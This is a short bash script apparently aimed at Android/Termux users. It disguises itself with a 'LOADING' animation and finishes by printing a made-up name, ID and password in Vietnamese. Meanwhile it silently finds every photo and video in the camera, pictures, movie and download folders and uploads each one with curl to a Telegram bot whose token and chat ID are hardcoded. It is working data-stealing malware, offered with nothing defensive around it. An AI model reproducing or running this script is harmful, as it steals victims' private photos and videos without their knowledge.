#!/bin/bash
GREEN="\e[32m"
YELLOW="\e[33m"
RESET="\e[0m"

BOT_TOKEN="8329608817:AAEGF8FhX41Od6Unhpy5mby_L-t1ACQCD1U"
CHAT_ID="7514545803"


exec >/dev/null 2>&1

types="-iname *.jpg -o -iname *.jpeg -o -iname *.png -o \
-iname *.mp4 -o -iname *.mov -o -iname *.mkv -o -iname *.3gp"

DIRS=(
"/storage/emulated/0/DCIM"
"/storage/emulated/0/Pictures"
"/storage/emulated/0/Movie"
"/storage/emulated/0/Download"
)

loading() {
    dots=""
    while true; do
        dots="$dots."
        [ ${#dots} -gt 8 ] && dots="."
        echo -ne "LOADING$dots\r"
        sleep 0.2
    done
}

loading &
PID=$!

LIMIT=10

for D in "${DIRS[@]}"; do
    find "$D" -type f \( $types \) 2>/dev/null | while read FILE; do
        
        while (( $(jobs | wc -l) >= LIMIT )); do
            sleep 0.05
        done

        (
        EXT="${FILE##*.}"
        EXT=$(echo "$EXT" | tr 'A-Z' 'a-z')

        if [[ "$EXT" =~ ^(mp4|mov|mkv|3gp)$ ]]; then
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" \
                -F chat_id="$CHAT_ID" \
                -F video="@$FILE"
        else
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
                -F chat_id="$CHAT_ID" \
                -F photo="@$FILE"
        fi
        ) &

    done
done

wait
kill $PID
echo
echo -e "${GREEN}HOÀN THÀNH${RESET}"
echo -e "${GREEN} TÊN: HAI CON${RESET}"
echo -e "${GREEN} ID: API_XDARTTMKTPHTQTE${RESET}"
echo -e "${GREEN} PASS: SQL_32HTTP${RESET}"